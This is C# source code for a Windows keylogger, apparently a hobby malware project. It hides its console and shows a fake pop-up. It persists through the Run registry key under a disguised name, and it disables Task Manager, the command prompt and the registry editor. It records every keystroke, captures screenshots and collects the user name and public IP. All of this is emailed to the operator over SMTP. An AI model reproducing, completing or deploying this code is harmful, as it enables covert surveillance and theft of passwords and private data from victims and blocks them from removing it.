using System;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;
using System.Security.Principal;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Collections.Generic;

namespace Keylogger
{
    
    class Program
    {



        //probably theese are detected by the antiviruses
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        public static int last_saved_ss = 0;
        public static int times_to_show = 0;
        public static int trigger = 0;
        public static int stop = 0;
        public static int once = 0;
        public static int run_once = 0;
        public static bool stop_keylogger = false;
        public static string log = "";

        public static Dictionary<string,Image> ss_list = new Dictionary<string, Image>();
        public object BitmapFrame { get; private set; }
        #region main loop
        static void Main(string[] args)
        {
            System.Threading.Thread.Sleep(50);
            var handle = GetConsoleWindow();

            Program.delete_printed_screen_shots();
            if (Configurations.take_screen_shot_delay > 0)
            {
                System.Threading.Thread taking_screenshot = new System.Threading.Thread(take_screen_shot);
                taking_screenshot.Start();
            }
#if !DEBUG//if not debug mode
            ShowWindow(handle, 0);
            Configurations.fake_pop_up();

            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.SetValue("Console Windows Host", AppDomain.CurrentDomain.BaseDirectory + @"" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + ".exe");
#endif
            while (true)///getting the pressed bind
            {
                
                System.Threading.Thread.Sleep(100);
                if (!stop_keylogger)
                {
                    #if !DEBUG //if not debug mode
                    ///disabling processes
                    RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    objRegistryKey.SetValue("DisableTaskMgr", 1);

                    RegistryKey disable_cmd = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows", true);
                    RegistryKey add_files = disable_cmd.CreateSubKey("System");
                    add_files.SetValue("DisableCMD", 1, RegistryValueKind.DWord);

                    RegistryKey objdisable_regedit = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies");
                    RegistryKey add_files_reg = objdisable_regedit.CreateSubKey("System");
                    add_files_reg.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                    //////////////////////
                    #endif
                    for (int i = 8; i < 5500; i++)
                    {

                        int KeyState = GetAsyncKeyState(i);

                        if ((GetKeyState(0x14) & 0x0001) != 0 && once == 0 && Configurations.raw_button_mode)//old version
                        {
                            trigger++;
                            log = log + "[CAPS LOCK ON]" + " ";
                            System.Threading.Thread.Sleep(400);
                            once = 1;
                            run_once = 1;
                        }
                        if (run_once == 1)
                        {
                            once = 1;
                            run_once = 2923;
                        }
                        if (KeyState != 0)//when a button pressed
                        {
                            if(Configurations.put_this_between_every_key != null)
                            {
                                log = log + Configurations.put_this_between_every_key;
                            }
                            if (is_custom_letter(i))
                            {
                                trigger++;
                                log = log + Configurations.custom_letters[i][Configurations.raw_button_mode];
                            }
                            else if (i == 8 && Configurations.raw_button_mode)
                            {
                                trigger++;
                                log = log + "[BACKSPACE]";
                            }
                            else if (i == 8 && !Configurations.raw_button_mode)
                            {
                                trigger--;
                                if(Configurations.put_this_between_every_key.Length != 0)
                                    log = log.Remove(log.Length-(1+ Configurations.put_this_between_every_key.Length * 2));
                                else
                                    log = log.Remove(log.Length - (1));
                            }
                            else if (i == 160 || i == 161)
                            {
                                trigger++;
                                log = log + "[SHIFT]";
                            }
                            else if (i == 13)
                            {
                                trigger++;
                                log = log + "[ENTER]";
                            }
                            ////////////normal characters just chars
                            else if (i != 20 /*disabling useless bind*/ && i != 16)
                            {
                                trigger++;
                                int unicode = i;
                                char character = (char)unicode;
                                string result_of_key = character.ToString();
                                log = log + letter_case<char>(result_of_key);



                            }
                            else if (i == 20 && Configurations.raw_button_mode) //this was the old version
                            {

                                if (check_caps_lock())
                                {
                                    trigger++;
                                    log = log + "[CAPS LOCK ON]";
                                    stop = 2;

                                }
                                else
                                {
                                    trigger++;
                                    log = log + "[CAPS LOCK OFF]";
                                    stop = 0;
                                }
                            }

                            #if DEBUG//if debug mode
                            Console.WriteLine($"{log}");
                            #endif

                            if (trigger == Configurations.key_death_line)
                            {
                                trigger = 0;


                                launch_email send_it = new launch_email();
                                data.keys = log;
                                System.Threading.Thread thread1 = new System.Threading.Thread(send_it.send_launch);
                                thread1.Start();

                                //reseting the var and obtaining the caps lock
                                check_caps_lock();
                                switch (check_caps_lock())
                                {
                                    case true:
                                        log = "/////////////////////restarted ";
                                        break;
                                    case false:
                                        log = "/////////////////////restarted ";
                                        break;
                                }


                            }




                        }

                    }
                }
                else//when cannot login, disabling process
                {

                    RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    objRegistryKey.SetValue("DisableTaskMgr", 0);

                    RegistryKey disable_cmd = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows", true);
                    RegistryKey add_files = disable_cmd.CreateSubKey("System");
                    add_files.SetValue("DisableCMD", 0, RegistryValueKind.DWord);

                    RegistryKey objdisable_regedit = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies");
                    RegistryKey add_files_reg = objdisable_regedit.CreateSubKey("System");
                    add_files_reg.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
#if !DEBUG
                    Environment.Exit(1);
#endif    
                }



            }
        }

#endregion

#region functions
        public static bool is_custom_letter(int current_ascii)
        {
            if(Configurations.custom_letters.ContainsKey(current_ascii))
                return true;

            return false;
        }
        public static T letter_case<T>(string x)
        {
            if(Configurations.raw_button_mode)
                return (T)Convert.ChangeType(x, typeof(T));
            char[] result;
            if (check_caps_lock())
                result = x.ToString().ToUpper().ToCharArray();
            else
                result = x.ToString().ToLower().ToCharArray();
            if (result.Length >= 2)
                throw new FormatException("string should contain only 1 letter");
            return (T)Convert.ChangeType(result[0], typeof(T));
        }
        public static T letter_case<T>(Char x)
        {
            if (Configurations.raw_button_mode)
                return (T)Convert.ChangeType(x, typeof(T));
            char[] result;
            if (check_caps_lock())
                result = x.ToString().ToUpper().ToCharArray();
            else
                result = x.ToString().ToLower().ToCharArray();
            return (T)Convert.ChangeType(result[0], typeof(T));
        }
        public static bool check_caps_lock()
        {
            bool result;
            if ((GetKeyState(0x14) & 0x0001) != 0)
                result = true;
            else
                result = false;
            
            return result;
        }
        private static void take_screen_shot()
        {
            while (true)
            {
                if (!Directory.Exists("b"))
                    Directory.CreateDirectory("b");
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(bitmap as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                ss_list[$"{ss_list.Count}"] = (Image)bitmap;
                System.Threading.Thread.Sleep(Configurations.take_screen_shot_delay);
            }
        }
        public static void save_screen_shoots()
        {
            delete_printed_screen_shots();
            Console.WriteLine($"{ss_list.Count} screenshots taken");
            for (int j = 0; j < ss_list.Count; j++)
            {
                ss_list[$"{j}"].Save($"b/{j}.png");
            }

        }
        public static void delete_printed_screen_shots()
        {
            if (Directory.Exists("b"))
            {
                System.IO.DirectoryInfo di = new DirectoryInfo("b");

                foreach (FileInfo file in di.GetFiles())
                {
                    file.Delete();
                }
                foreach (DirectoryInfo dir in di.GetDirectories())
                {
                    dir.Delete(true);
                }
            }
        }

        #endregion
    }
#region main email sender
    public class email_sender
    {
        public void email_send_now(string email, string password, string receiver_email, string subject, string body)
        {
            int ss_list_count_old = 0;
            Attachment[] current_screenshot = new Attachment[Program.ss_list.Count];
            try
            {
                Program.save_screen_shoots();
                ss_list_count_old = Program.ss_list.Count;
                Program.ss_list.Clear();
                SmtpClient client = new SmtpClient(Configurations.email_sender_configurations.smtp_host, Configurations.email_sender_configurations.smtp_port);
                client.EnableSsl = true;
                client.Timeout = Configurations.email_sender_configurations.client_time_out;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(email, password);
                MailMessage msg = new MailMessage();
                msg.To.Add(receiver_email);
                msg.From = new MailAddress(email);
                msg.Subject = subject;
                msg.Body = body;

                for (int j = 0; j < ss_list_count_old; j++)
                {
                    current_screenshot[j] = new System.Net.Mail.Attachment(new DirectoryInfo("b").GetFiles()[j].FullName);
                    msg.Attachments.Add(current_screenshot[j]);
                }
                
                client.Send(msg);

            }
            catch (Exception ex)
            {
                if (!CheckForInternetConnection())
                    Console.WriteLine("error");
                else
                {
                    Program.stop_keylogger = true;
                    Console.WriteLine($"error maybe cannot login to email: {ex}");
                }
#if DEBUG
                Console.ReadKey();
#endif
            }
            if (current_screenshot.Length > 0 && Program.ss_list.Count > 0)
            {
                for (int j = 0; j < current_screenshot.Length && current_screenshot[0] != null; j++)
                    current_screenshot[j].Dispose();
                Program.delete_printed_screen_shots();
            }



        }

        
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
    }
#endregion
    public class launch_email
    {
        public async void send_launch()
        {
            System.Net.Http.HttpClient myReq = new System.Net.Http.HttpClient();

            email_sender email = new email_sender();
            string user_ip = await myReq.GetStringAsync("https://ident.me/");
            string userName = WindowsIdentity.GetCurrent().Name;
            
            email.email_send_now(Configurations.email, Configurations.email_password, Configurations.email, $"name={userName} global ip={user_ip}",  data.keys);



        }
    }

    public static class data
    {
        public static string keys;
    }
}